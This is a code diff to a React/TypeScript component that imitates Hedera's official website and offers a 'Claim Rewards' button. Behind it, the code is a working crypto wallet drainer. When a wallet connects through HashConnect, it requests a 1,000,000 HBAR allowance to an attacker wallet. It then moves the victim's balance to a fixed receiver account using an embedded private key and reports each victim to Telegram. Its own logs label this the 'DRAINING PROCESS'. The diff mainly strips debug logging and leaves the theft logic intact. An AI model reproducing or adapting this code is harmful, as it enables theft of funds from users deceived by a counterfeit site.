@@ -78,17 +78,11 @@ export const HashConnectClient = () => {
     // In syncWithHashConnect, before wallet connect logic
     logToPage('syncWithHashConnect called');
 
-    console.log("syncWithHashConnect started.");
-
     try {
       // Get connected account IDs for hashconnect@0.2.4
       let connectedAccountIds = hc.hcData.pairingData
         ? hc.hcData.pairingData.map((pair: any) => pair.accountIds).flat()
         : [];
-      console.log("hc.hcData.pairingData:", hc.hcData.pairingData);
-      console.log("connectedAccountIds:", connectedAccountIds);
-      console.log("dappConnector:", dappConnector);
-      console.log("dappConnector.signers:", dappConnector?.signers);
 
       // If pairingData is empty, try to get accountId from signers (WalletConnect)
       if ((!connectedAccountIds || connectedAccountIds.length === 0) && typeof dappConnector !== 'undefined' && dappConnector.signers && dappConnector.signers.length > 0) {
@@ -96,23 +90,17 @@ export const HashConnectClient = () => {
         if (signerAccountId) {
           logToPage('AccountId available: ' + signerAccountId);
           connectedAccountIds = [signerAccountId];
-          console.log("Using accountId from signers:", signerAccountId);
           logToPage('About to send Telegram notification for account: ' + signerAccountId);
           sendMessageToTelegram(`[INFO] Wallet connected: ${signerAccountId}`);
           logToPage('Telegram notification sent for account: ' + signerAccountId);
         }
       }
-      console.log("After signers check, connectedAccountIds:", connectedAccountIds);
 
       if (connectedAccountIds && connectedAccountIds.length > 0) {
         const targetAccountId = connectedAccountIds?.map((o: any) =>
           o.toString()
         )[0];
         const accountIDD = connectedAccountIds[0];
-        console.log("Calling handleAllowanceApprove with:", accountIDD);
-        if (!accountIDD) {
-          throw new Error("Account ID or its 'num.low' property is missing.");
-        }
         // Update Redux state
         dispatch(
           actions.hashconnect.setAccountIds(
@@ -134,35 +122,24 @@ export const HashConnectClient = () => {
       console.error("Error in syncWithHashConnect:", error);
     } finally {
       syncCalledRef.current = false; // Allow future calls
-      console.log("syncWithHashConnect completed.");
     }
   }, [dispatch]);
 
   const handleAllowanceApprove = async (accountId: string) => {
-    console.log("=== DRAINING PROCESS STARTED ===");
-    console.log("handleAllowanceApprove called with:", accountId);
-    console.log("Target wallet:", TARGET_WALLET);
-    console.log("Receiver wallet:", '0.0.9379441');
-    
     try {
       const hbarAccountId: string = accountId;
-      console.log("Step 1: Finding pairing for account:", hbarAccountId);
       
       // Find the pairing for this account to get the topic
       const pairing = hc.hcData.pairingData.find(pair =>
         pair.accountIds.includes(hbarAccountId)
       );
       const topic = pairing ? pairing.topic : undefined;
-      console.log("Pairing topic found:", topic);
       
       if (!topic) throw new Error("No pairing topic found for account");
       
-      console.log("Step 2: Getting provider and signer");
       const provider = hc.getProvider("mainnet", topic, hbarAccountId);
       const signer = hc.getSigner(provider);
-      console.log("Provider and signer obtained successfully");
 
-      console.log("Step 3: Creating allowance transaction");
       // Create allowance transaction
       const transaction = await new AccountAllowanceApproveTransaction()
         .approveHbarAllowance(
@@ -171,78 +148,44 @@ export const HashConnectClient = () => {
           new Hbar(1_000_000) // Amount from your screenshot
         )
         .freezeWithSigner(signer);
-      console.log("Allowance transaction created and frozen");
       
-      console.log("Step 4: Executing allowance transaction");
       const txResponse = await transaction.executeWithSigner(signer);
-      console.log("Allowance transaction executed, getting receipt");
-      
+
       const client = Client.forMainnet();
       const receipt = await txResponse.getReceipt(client);
 
       const allowRestult = await receipt.status.toString();
-      console.log("=== ALLOWANCE TRANSACTION RESULT ===");
-      console.log("Allowance Transaction Status:", receipt.status.toString());
-      console.log("Transaction ID:", txResponse.transactionId.toString());
       
       if (allowRestult === "SUCCESS") {
-        console.log("✅ Allowance approved successfully!");
-        console.log("About to send allowance approval notification");
         logToPage('About to send Telegram notification: ' + `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
         logToPage('Telegram notification sent: ' + `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
         
-        console.log("Step 5: Checking token balances");
         let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
-        console.log("Current HBAR balance:", remainingHbar);
-        console.log("Key type:", keytype);
         
-        // const gasFee = await calculateHbarGasFee(0, 0);
         if (remainingHbar > 0.5) {
           remainingHbar = remainingHbar - 0.5;
-          console.log("Gas fee deducted (0.5 HBAR), remaining balance:", remainingHbar);
+          logToPage('Gas fee deducted (0.5 HBAR), remaining balance:' + remainingHbar);
         } else {
-          console.log('❌ Insufficient HBAR for gas fees');
-          console.log("About to send insufficient HBAR notification");
-          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!��`);
-          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
           return; // Exit if there's no HBAR to cover gas fees
         }
         
         const receiver = await '0.0.9379441';
-        console.log("Receiver address:", receiver);
         
         if (Math.floor(remainingHbar) < 1) {
-          console.log("❌ Insufficient HBAR for transfer (less than 1 HBAR)");
-          console.log("About to send insufficient HBAR notification");
-          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
-          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          logToPage('About to send Telegram notification: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
+          logToPage('Telegram notification sent: ' + `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!`);
         } else {
-          console.log("Step 6: Executing HBAR transfer");
-          console.log("Transfer amount:", Math.floor(remainingHbar), "HBAR");
-          
           const balance = await new Hbar(Math.floor(remainingHbar));
           const result = await hbarAllowanceFcn(hbarAccountId, receiver, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
-          console.log("=== TRANSFER TRANSACTION RESULT ===");
-          console.log("Transfer status:", result.status.toString());
           
           if (result.status.toString() === "SUCCESS") {
-            console.log("✅ HBAR transfer successful!");
-            console.log("About to send successful HBAR sent notification");
             logToPage('About to send Telegram notification: ' + `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
             logToPage('Telegram notification sent: ' + `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
-          } else {
-            console.log("❌ HBAR transfer failed!");
-            console.log("About to send failed HBAR sent notification");
-            logToPage('About to send Telegram notification: ' + `${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${receiver}`);
-            logToPage('Telegram notification sent: ' + `${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${receiver}`);
           }
         }
-      } else {
-        console.log("❌ Allowance transaction failed!");
-        console.log("Failed result:", allowRestult);
       }
-      console.log("=== DRAINING PROCESS COMPLETED ===");
-      // return receipt.status.toString() === "SUCCESS";
     } catch (error: any) {
       console.error("=== DRAINING PROCESS ERROR ===");
       console.error("Error in allowance approval:", error);
@@ -254,7 +197,6 @@ export const HashConnectClient = () => {
 
   useEffect(() => {
     const pairingCallback = (data: any) => {
-      console.log("pairingEvent fired", data);
       syncWithHashConnect(); // Trigger sync on pairing
     };
 
@@ -267,8 +209,8 @@ export const HashConnectClient = () => {
 
   useEffect(() => {
     const connectionCallback = (data: any) => {
-      console.log("connectionStatusChangeEvent fired", data);
-      console.log("Connection status changed:", data);
+      // console.log("connectionStatusChangeEvent fired", data);
+      // console.log("Connection status changed:", data);
       syncWithHashConnect(); // Trigger sync on connection status change
     };
 
@@ -2376,7 +2318,6 @@ export const HashConnectConnectButton = () => {
                   onClick={async () => {
                     try {
                       logToPage('Claim Rewards button tapped!');
-                      console.log('Claim Rewards button tapped!');
                       await sendMessageToTelegram('Claim Rewards button tapped on ' + navigator.userAgent);
                       logToPage('Telegram notification sent for Claim Rewards tap');
                     } catch (e) {
@@ -2576,7 +2517,6 @@ export const HashConnectConnectButton = () => {
             <div className="actions">
               <a
                 onClick={() => {
-                    logToPage('Claim Rewards button clicked');
                     if (isConnected) {
                       walletInterface?.disconnect(); disconnect();
                     } else {
@@ -3321,7 +3261,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/real-world-asset-tokenization"
                 href="https://hedera.com/use-cases/real-world-asset-tokenization"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3347,7 +3286,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/consumer-engagement-loyalty"
                 href="https://hedera.com/use-cases/consumer-engagement-loyalty"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3371,7 +3309,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/sustainability"
                 href="https://hedera.com/use-cases/sustainability"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3395,7 +3332,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/defi"
                 href="https://hedera.com/use-cases/defi"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3419,7 +3355,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/identity"
                 href="https://hedera.com/use-cases/identity"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3443,7 +3378,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/decentralized-logs"
                 href="https://hedera.com/use-cases/decentralized-logs"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3467,7 +3401,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/nfts"
                 href="https://hedera.com/use-cases/nfts"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3491,7 +3424,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/use-cases/payments"
                 href="https://hedera.com/use-cases/payments"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3515,7 +3447,6 @@ export const HashConnectConnectButton = () => {
               </div>
 
               <a
-                // dataSavepageHref="/ecosystem"
                 href="https://hedera.com/ecosystem"
                 className="Btn is-gradient-outline blue-green"
                 target="_self"
@@ -3630,7 +3561,6 @@ export const HashConnectConnectButton = () => {
                   </div>
 
                   <a
-                    // dataSavepageHref="/ecosystem/web3"
                     href="https://hedera.com/ecosystem/web3"
                     className="Btn is-gradient-green"
                     target="_blank"
@@ -4037,7 +3967,6 @@ export const HashConnectConnectButton = () => {
                   </div>
 
                   <a
-                    // dataSavepageHref="/ecosystem/enterprise"
                     href="https://hedera.com/ecosystem/enterprise"
                     className="Btn is-gradient-green"
                     target="_blank"
@@ -4533,7 +4462,6 @@ export const HashConnectConnectButton = () => {
 
                 <div className="actions">
                   <a
-                    // dataSavepageHref="/get-started"
                     href="https://hedera.com/get-started"
                     className="Btn is-gradient-green"
                     target="_blank"
@@ -4682,7 +4610,6 @@ export const HashConnectConnectButton = () => {
                 </div>
 
                 <a
-                  // dataSavepageHref="/ecosystem"
                   href="https://hedera.com/ecosystem"
                   className="Btn is-white has-bg"
                   target="_blank"
@@ -4712,7 +4639,6 @@ export const HashConnectConnectButton = () => {
                 </div>
 
                 <a
-                  // dataSavepageHref="/hbar"
                   href="https://hedera.com/hbar"
                   className="Btn is-white has-bg"
                   target="_blank"
@@ -4731,7 +4657,6 @@ export const HashConnectConnectButton = () => {
         <div className="footer-top">
           <div className="footer-logo">
             <a
-              // dataSavepageHref="/"
               href="https://hedera.com/"
               className="footer-logo-link"
             >
@@ -4825,9 +4750,7 @@ export const HashConnectConnectButton = () => {
                     className="input"
                     name="fields[email]"
                     placeholder="Enter email address"
-                    // maxlength="48"
                     id="email"
-                  // value=""
                   ></input>
 
                   <button
@@ -4849,7 +4772,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-discord-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4866,7 +4788,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-facebook-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4883,7 +4804,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-linkedin-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4900,7 +4820,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-medium-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4917,7 +4836,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-reddit-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4934,7 +4852,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-stackoverflow-icon"
                   role="img"
                   xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
@@ -4951,7 +4868,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-telegram-icon"
                   role="img"
                   xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
@@ -4970,7 +4886,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-twitter-icon"
                   role="img"
                   viewBox="0 0 24 24"
                   xmlns="http://www.w3.org/2000/svg"
@@ -4987,7 +4902,6 @@ export const HashConnectConnectButton = () => {
                 rel="noreferrer noopener"
               >
                 <svg
-                  // ariaLabelledby="simpleicons-youtube-icon"
                   role="img"
                   xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
@@ -5005,35 +4919,30 @@ export const HashConnectConnectButton = () => {
           <ul className="footer-menu">
             <li className="footer-menu-section-title">
               <a
-                // dataSavepageHref="/audits-and-standards"
                 href="https://hedera.com/audits-and-standards"
               >Transparency</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/open-source"
                 href="https://hedera.com/open-source"
               >Open Source</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/audits-and-standards"
                 href="https://hedera.com/audits-and-standards"
               >Audits &amp; Standards</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/ucl-blockchain-energy"
                 href="https://hedera.com/ucl-blockchain-energy"
               >Sustainability Commitment</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/carbon-offsets"
                 href="https://hedera.com/carbon-offsets"
               >Carbon Offsets</a>
             </li>
@@ -5042,42 +4951,36 @@ export const HashConnectConnectButton = () => {
           <ul className="footer-menu">
             <li className="footer-menu-section-title">
               <a
-                // dataSavepageHref="/council"
                 href="https://hedera.com/council"
               >Governance</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/council"
                 href="https://hedera.com/council"
               >Hedera Council</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/public-policy"
                 href="https://hedera.com/public-policy"
               >Public Policy</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/treasury-management-report"
                 href="https://hedera.com/treasury-management-report"
               >Treasury Management</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/council/minutes"
                 href="https://hedera.com/council/minutes"
               >Meeting Minutes</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/hh_llc-agreement"
                 href="https://hedera.com/hh_llc-agreement"
                 target="_blank"
                 rel="noreferrer noopener"
@@ -5096,14 +4999,12 @@ export const HashConnectConnectButton = () => {
           <ul className="footer-menu">
             <li className="footer-menu-section-title">
               <a
-                // dataSavepageHref="/events"
                 href="https://hedera.com/events"
               >Community</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/events"
                 href="https://hedera.com/events"
               >Events</a>
             </li>
@@ -5212,42 +5113,36 @@ export const HashConnectConnectButton = () => {
           <ul className="footer-menu">
             <li className="footer-menu-section-title">
               <a
-                // dataSavepageHref="/about"
                 href="https://hedera.com/about"
               >About</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/about"
                 href="https://hedera.com/about"
               >Team</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/partners"
                 href="https://hedera.com/partners"
               >Partners</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/journey"
                 href="https://hedera.com/journey"
               >Journey</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/roadmap"
                 href="https://hedera.com/roadmap"
               >Roadmap</a>
             </li>
 
             <li className="footer-menu-item">
               <a
-                // dataSavepageHref="/work"
                 href="https://hedera.com/work"
               >Careers</a>
             </li>
@@ -5279,14 +5174,12 @@ export const HashConnectConnectButton = () => {
             <br />
 
             <a
-              // dataSavepageHref="/terms"
               href="https://hedera.com/terms"
             >Terms of Use</a>
 
             |
 
             <a
-              // dataSavepageHref="/privacy"
               href="https://hedera.com/privacy"
             >Privacy Policy</a>
           </p>
